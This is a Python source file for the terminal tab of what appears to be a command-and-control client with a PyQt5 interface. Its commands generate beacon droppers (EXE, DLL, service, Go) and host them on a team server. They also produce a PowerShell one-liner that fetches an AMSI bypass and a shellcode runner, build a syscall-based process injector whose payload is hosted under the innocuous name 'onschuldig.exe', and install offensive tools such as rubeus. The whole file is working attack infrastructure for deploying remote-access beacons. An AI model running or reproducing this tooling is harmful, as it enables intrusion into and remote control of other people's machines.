import sys
import os
import time
import random
import string 
from datetime import datetime
from threading import Thread
from threading import Thread, Lock
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *


#
# Dropper modules
#
if os.path.exists(os.path.join(os.getcwd(), 'PowershellWebDelivery')):
    sys.path.insert(1, './PowershellWebDelivery/')
    import GeneratePowershellLauncher

if os.path.exists(os.path.join(os.getcwd(), 'PeDropper')):
    sys.path.insert(1, './PeDropper/')
    import GenerateDropperBinary

if os.path.exists(os.path.join(os.getcwd(), 'GoDroplets')):
    sys.path.insert(1, './GoDroplets/')
    import GoDroplets.scripts.GenerateGoDroplets as GenerateGoDroplets

if os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
    sys.path.insert(1, './PeInjectorSyscall/')
    import GenerateInjector

sys.path.insert(1, './Batcave')
import batcave

#
# Constant
#
LogFileName = "Terminal.log"
HistoryFileName = ".termHistory"

HttpType = "http"
HttpsType = "https"

GrpcGetBeaconBinaryInstruction = "getBeaconBinary"
GrpcPutIntoUploadDirInstruction = "putIntoUploadDir"
GrpcInfoListenerInstruction = "infoListener"
GrpcBatcaveUploadToolInstruction = "batcaveUpload"

BeaconHttpFile = "BeaconHttp.exe"

ErrorInstruction = "Error"

HelpInstruction = "help"

BatcaveInstruction = "Batcave"
BatcaveHelp = """Batcave:
Install the given module locally or on the team server:
exemple:
- Batcave Install rubeus
- Batcave BundleInstall recon
- Batcave Search rec"""

GenerateInstruction = "Generate"
GenerateHelp = """Generate:
Generate a payload to deploy a beacon and store it on the client:
exemple:
- Generate WindowsExecutable listenerHash exe/dll/svc
- Generate GoWindowsExecutable listenerHash exe/dll/svc"""

WindowsExecutableInstruction = "WindowsExecutable"
WindowsExecutableHelp = """Generate WindowsExecutable:
Generate WindowsExecutable, generate 2 modules dropper, one EXE and one DLL from the appropriate beacon link to the given listener:
exemple:
- Generate WindowsExecutable listenerHash"""

GoWindowsExecutableInstruction = "GoWindowsExecutable"
GoWindowsExecutableHelp = """Generate GoWindowsExecutable:
Generate GoWindowsExecutable, generate 3 modules dropper compiled with go, one EXE, one DLL and one SVC from the appropriate beacon link to the given listener:
exemple:
- Generate GoWindowsExecutable listenerHash"""

GenerateAndHostInstruction = "GenerateAndHost"
GenerateAndHostHelp = """GenerateAndHost:
GenerateAndHost a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""

PowershellWebDeliveryInstruction = "PowershellWebDelivery"
PowershellWebDeliveryHelp = """GenerateAndHost PowershellWebDelivery:
Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
exemple:
- GenerateAndHost PowershellWebDelivery listenerHash
- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""

PeInjectorSyscallInstruction = "PeInjectorSyscall"
PeInjectorSyscallHelp = """GenerateAndHost PeInjectorSyscall:
exemple:
- GenerateAndHost PeInjectorSyscall processToInject listenerHash
- GenerateAndHost PeInjectorSyscall processToInject listenerHash hostListenerHash"""

HostInstruction = "Host"
HostHelp="""Host:
Host upload a file on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- Host file hostListenerHash"""

def getHelpMsg():
    helpText  = HelpInstruction+"\n"
    helpText += HostInstruction+"\n"
    helpText += GenerateInstruction+"\n"
    helpText += GenerateAndHostInstruction
    return helpText

completerData = [
    (HelpInstruction,[]),
    (HostInstruction,[]),
    (GenerateInstruction,[
            (WindowsExecutableInstruction,[]),
            (GoWindowsExecutableInstruction,[]),
             ]),
    (GenerateAndHostInstruction,[
            (PowershellWebDeliveryInstruction,[]),
            ('PeInjectorSyscall',[]),
             ]),
    (BatcaveInstruction, [
            ("Install", []),
            ("BundleInstall", []),
            ("Search", [])
             ])
]

InfoProcessing = "Processing..." 
ErrorCmdUnknow = "Error: Command Unknown"
ErrorFileNotFound = "Error: File doesn't exist."
ErrorListener = "Error: Download listener must be of type http or https."


#
# Terminal tab implementation
#
class Terminal(QWidget):
    tabPressed = pyqtSignal()
    logFileName=""

    def __init__(self, parent, ip, port, devMode):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)

        self.grpcClient = GrpcClient(ip, port, devMode)

        self.logFileName=LogFileName

        self.editorOutput = QPlainTextEdit()
        self.editorOutput.setFont(QFont("Courier"));
        self.editorOutput.setReadOnly(True)
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)


    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)


    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)


    def printInTerminal(self, cmd, result):
        now = datetime.now()
        formater = '<p style="white-space:pre">'+'<span style="color:blue;">['+now.strftime("%Y:%m:%d %H:%M:%S").rstrip()+']</span>'+'<span style="color:red;"> [+] </span>'+'<span style="color:red;">{}</span>'+'</p>'

        if cmd:
            self.editorOutput.appendHtml(formater.format(cmd))
            self.editorOutput.insertPlainText("\n")
        if result:
            self.editorOutput.insertPlainText(result)
            self.editorOutput.insertPlainText("\n")


    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            self.printInTerminal("", "")

        else:
            cmdHistoryFile = open(HistoryFileName, 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()

            logFile = open("./logs/"+self.logFileName, 'a')
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')
            logFile.close()

            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if len(instructions) < 1:
                return;

            if instructions[0]==HelpInstruction:
                self.runHelp()

            elif instructions[0]==BatcaveInstruction:
                self.runBatcave(commandLine, instructions)

            elif instructions[0]==GenerateInstruction:
                self.runGenerate(commandLine, instructions)

            elif instructions[0]==GenerateAndHostInstruction:
                self.runGenerateAndHost(commandLine, instructions)
            
            elif instructions[0]==HostInstruction:
                self.runHost(commandLine, instructions)
            
            else:
                self.printInTerminal(commandLine, ErrorCmdUnknow)

        self.setCursorEditorAtEnd()


    def runHelp(self):
        self.printInTerminal("help", getHelpMsg())


    def runBatcave(self, commandLine, instructions):
        if len(instructions) < 3:
            self.printInTerminal(commandLine, BatcaveHelp)
            return;

        cmd = instructions[1]
        batgadget = instructions[2]

        if cmd == "Install":
            filePath = batcave.downloadBatGadget(batgadget)
            try:
                filename = os.path.basename(filePath)
                with open(filePath, mode='rb') as fileDesc:
                    payload = fileDesc.read()
            except IOError:
                self.printInTerminal(commandLine, ErrorFileNotFound)
                return  

            commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
            print("Sent " + commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            self.printInTerminal(commandLine, f"Added {filename} to TeamServer Tools.")
            return    

        elif cmd == "BundleInstall":

            filePathList = batcave.downloadBatBundle(batgadget)
            line = ""
            for filePath in filePathList:
                try:
                    filename = os.path.basename(filePath)
                    with open(filePath, mode='rb') as fileDesc:
                        payload = fileDesc.read()
                except IOError:
                    self.printInTerminal(commandLine, ErrorFileNotFound)
                    return  

                commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

                result = resultTermCommand.result
                if ErrorInstruction in result:
                    self.printInTerminal(commandLine, result)
                    return  

                line += f"Added {filename} to TeamServer Tools.\n"
            line += f"BatBundle {batgadget} successfully installed!"
            self.printInTerminal(commandLine, line)

        elif cmd == "Search":
            result = batcave.searchTheBatcave(batgadget)
            self.printInTerminal(commandLine, result)
            return    

        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return     


    #
    # Host
    # 
    def runHost(self, commandLine, instructions):
        if len(instructions) < 3:
            self.printInTerminal(commandLine, HostHelp)
            return;

        filePath = instructions[1]
        hostListenerHash = instructions[2]

        commandTeamServer = GrpcInfoListenerInstruction+" "+hostListenerHash
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            self.printInTerminal(commandLine, ErrorListener)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        # Upload the file and get the path
        try:
            filename = os.path.basename(filePath)
            with open(filePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.printInTerminal(commandLine, ErrorFileNotFound)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+hostListenerHash+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
        self.printInTerminal(commandLine, result)


    #
    # runGenerate
    #   
    def runGenerate(self, commandLine, instructions):
        if len(instructions) < 2:
            self.printInTerminal(commandLine, GenerateHelp)
            return; 

        mode = instructions[1]
        if mode == WindowsExecutableInstruction or mode == GoWindowsExecutableInstruction:
            if len(instructions) < 3 and mode == WindowsExecutableInstruction:
                self.printInTerminal(commandLine, WindowsExecutableHelp)
                return; 
            
            elif len(instructions) < 3 and mode == GoWindowsExecutableInstruction:
                self.printInTerminal(commandLine, GoWindowsExecutableHelp)
                return; 

            listener = instructions[2]

            commandTeamServer = GrpcInfoListenerInstruction+" "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]

            commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listener
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            print("Beacon size", len(resultTermCommand.data))
            beaconFilePath = "./"+BeaconHttpFile
            beaconFile = open(beaconFilePath, "wb")
            beaconFile.write(resultTermCommand.data)

            beaconArg = ip+" "+port
            if scheme==HttpType or scheme==HttpsType:
                beaconArg = beaconArg+" "+scheme

            if mode == GoWindowsExecutableInstruction:
                formatOutput = "all"                    
                if len(instructions) >= 4 and (instructions[3] in ["exe","dll","svc","all"]) :
                    formatOutput = instructions[3]

                exeName = listener+"_"+scheme

                self.printInTerminal(commandLine, InfoProcessing)
                thread = Thread(target = self.GenerateGoDroplets, args = (commandLine, beaconFilePath, beaconArg, formatOutput, exeName))
                thread.start()
                return

            elif mode == WindowsExecutableInstruction:
                self.printInTerminal(commandLine, InfoProcessing)
                thread = Thread(target = self.GenerateDropperBinary, args = (commandLine, beaconFilePath, beaconArg))
                thread.start()
                return
            
        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return;

    #
    # GenerateGoDroplets
    #
    def GenerateGoDroplets(self, commandLine,  beaconFilePath, beaconArg, formatOutput, exeName):
        dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")

        result = GenerateGoDroplets.generateGoDroplets(beaconFilePath, beaconArg, formatOutput, exeName)

        if not "".join(result):
            self.printInTerminal(commandLine, "Error: GoWindowsExecutable failed. Check if go is correctly installed.")
            return   
        
        self.printInTerminal(commandLine, ("\n").join(result))
        return

    #
    # GenerateDropperBinary
    #
    def GenerateDropperBinary(self, commandLine,  beaconFilePath, beaconArg):
        dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")

        result =  "Dropper EXE path: " + dropperExePath + "\n"
        result += "Dropper DLL path: " + dropperDllPath 
        self.printInTerminal(commandLine, result)
        return

    #
    # GenerateAndHost 
    #
    def runGenerateAndHost(self, commandLine, instructions):
        if len(instructions) < 2:
            self.printInTerminal(commandLine, GenerateAndHostHelp)
            return;

        mode = instructions[1]

        if mode == PowershellWebDeliveryInstruction:
            if len(instructions) < 3:
                self.printInTerminal(commandLine, PowershellWebDeliveryHelp)
                return;
            
            # should take 2 listeners: 
            #   the http/https listener to download the payload from
            #   one listner for the beacon to connect to
            listenerBeacon = instructions[2]
            if  len(instructions) >= 4:
                listenerDownload = instructions[3]
            else:
                listenerDownload = listenerBeacon

            self.printInTerminal(commandLine, InfoProcessing)
            thread = Thread(target = self.GenerateAndHostPowershellWebDelivery, args = (commandLine, listenerDownload, listenerBeacon))
            thread.start()

        elif mode == PeInjectorSyscallInstruction:
            if len(instructions) < 4:
                self.printInTerminal(commandLine, PeInjectorSyscallHelp)
                return;
            
            # should take 2 listeners: 
            #   the http/https listener to download the payload from
            #   one listner for the beacon to connect to
            processToInject = instructions[2]
            listenerBeacon = instructions[3]
            if  len(instructions) >= 5:
                listenerDownload = instructions[4]
            else:
                listenerDownload = listenerBeacon

            self.printInTerminal(commandLine, InfoProcessing)
            thread = Thread(target = self.GenerateAndHostPeInjectorSyscall, args = (commandLine, listenerDownload, listenerBeacon, processToInject))
            thread.start()
    
        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return;


    #
    # GenerateAndHostPowershellWebDelivery
    #
    def GenerateAndHostPowershellWebDelivery(self, commandLine,  listenerDownload, listenerBeacon):
        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            self.printInTerminal(commandLine, ErrorListener)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return   

        print("Beacon size", len(resultTermCommand.data))
        beaconFilePath = "./"+BeaconHttpFile
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme==HttpType or scheme==HttpsType:
            beaconArg = beaconArg+" "+scheme

        # Generate the 2 files
        payloadAmsi, payloadShellcodeRunner = GeneratePowershellLauncher.generatePayloads(beaconFilePath, beaconArg, "")

        # Upload the 2 files and get the path
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathAmsiBypass = downloadPath
        pathAmsiBypass = pathAmsiBypass + filename
        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadAmsi.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  

        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        pathShellcodeRunner = downloadPath
        pathShellcodeRunner = pathShellcodeRunner + filename
        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payloadShellcodeRunner.encode("utf-8"))
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  

        # upload the 2 file to the server, get the url to reach them
        # generate the oneliner
        oneLiner = GeneratePowershellLauncher.generateOneLiner(ipDownload, portDownload, scheme, pathAmsiBypass, pathShellcodeRunner)
        self.printInTerminal(commandLine, oneLiner)


    #
    # GenerateAndHostPeInjectorSyscall
    #
    def GenerateAndHostPeInjectorSyscall(self, commandLine,  listenerDownload, listenerBeacon, processToInject):
        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            self.printInTerminal(commandLine, ErrorListener)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return   

        print("Beacon size", len(resultTermCommand.data))
        beaconFilePath = "./"+BeaconHttpFile
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme==HttpType or scheme==HttpsType:
            beaconArg = beaconArg+" "+scheme

        # Generate the 2 files
        process = processToInject
        filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
        urlStage =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename

        if not os.path.exists(os.path.join(os.getcwd(), 'PeInjectorSyscall')):
            self.printInTerminal(commandLine, "PeInjectorSyscall module not found")
            return  

        dropperExePath, shellcodePath = GenerateInjector.generatePayloads(beaconFilePath, beaconArg, "", process, urlStage)

        # Upload the file and get the path
        try:
            with open(dropperExePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.printInTerminal(commandLine, ErrorFileNotFound)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+"onschuldig.exe"
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  
                
        try:
            with open(shellcodePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.printInTerminal(commandLine, ErrorFileNotFound)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + "onschuldig.exe"
        self.printInTerminal(commandLine, result)

    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile(HistoryFileName)):
            cmdHistoryFile = open(HistoryFileName)
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open('.termHistory')
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)
